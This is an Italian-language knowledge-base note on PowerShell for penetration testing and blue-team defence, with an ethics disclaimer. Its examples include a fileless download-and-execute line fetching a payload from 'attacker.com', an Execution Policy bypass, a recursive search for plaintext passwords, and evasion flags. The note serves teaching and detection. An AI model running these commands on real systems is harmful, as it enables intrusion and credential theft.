---
tipo: entita
tag: [windows]
fase: 2
fonti: 3
aggiornato: 2026-06-20
stato: maturo
aliases: ["PowerShell"]

---

# PowerShell

> Nota etica: PowerShell è uno strumento legittimo di amministrazione. Le tecniche offensive elencate servono a capire come rilevarle. Usare solo in ambienti autorizzati.

## Cos'è

PowerShell è la shell a riga di comando e linguaggio di scripting di Microsoft, integrata in tutti i sistemi Windows moderni. Combina comandi interattivi (cmdlet) con la potenza del framework .NET, rendendola indispensabile sia per l'amministrazione di sistema che per la sicurezza offensiva e difensiva.

## Uso tipico

```powershell
# Eseguire uno script con bypass della Execution Policy (comune in attacchi)
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Scaricare ed eseguire in memoria (fileless, senza toccare disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Enumerare utenti locali
Get-LocalUser | Select-Object Name, Enabled, LastLogon

# Enumerare utenti di Active Directory
Get-ADUser -Filter * -Properties MemberOf | Select-Object SamAccountName, MemberOf

# Cercare file con password in chiaro
Get-ChildItem -Recurse -Include *.txt,*.xml,*.config |
  Select-String -Pattern "password" -CaseSensitive:$false
```

Le opzioni chiave di `powershell.exe` usate negli attacchi:
- `-NoProfile` — non carica il profilo utente (più furtivo)
- `-WindowStyle Hidden` — esecuzione senza finestra visibile
- `-EncodedCommand` — payload in Base64 per evasione dei filtri

## Quando si usa

PowerShell è usato durante quasi tutte le fasi del pentest su Windows:
- **Ricognizione/Enumerazione**: query AD, servizi, processi, permessi
- **Accesso iniziale**: download di payload, [[Pass-the-Hash]] via WinRM
- **Privilege Escalation Windows**: eseguire PowerUp, WinPEAS
- **Movimento laterale**: connettersi a host remoti via `Invoke-Command`

È anche centrale nel blue-team: analisi di [[Windows Event Log]], scripting per risposta agli incidenti.

## Note e trucchi

- **Script Block Logging** (Event ID 4104): abilitarlo nel [[Windows Event Log]] registra tutto il codice PowerShell eseguito — essenziale per il blue-team.
- **AMSI** (Antimalware Scan Interface): Windows 10+ scansiona i comandi PowerShell in tempo reale. Gli attaccanti cercano di bypassarlo.
- PowerShell 5.1 (Win10 built-in) include **Constrained Language Mode** che può limitare l'uso da parte di script non firmati.
- PowerShell Core (7+) è multipiattaforma ma non ha tutti i moduli Windows.
- Preferire `Get-WinEvent` invece di `Get-EventLog` (deprecato).

## Collegamenti

- [[Windows Event Log]]
- [[Active Directory]]
- [[Privilege Escalation Windows]]
- [[Pass-the-Hash]]
- [[CrackMapExec]]
- [[Utenti e Permessi Windows]]

## Fonti

- Microsoft Learn — PowerShell Documentation: https://learn.microsoft.com/en-us/powershell/
- HackTricks — PowerShell: https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
- MITRE ATT&CK T1059.001 — Command and Scripting Interpreter: PowerShell: https://attack.mitre.org/techniques/T1059/001/
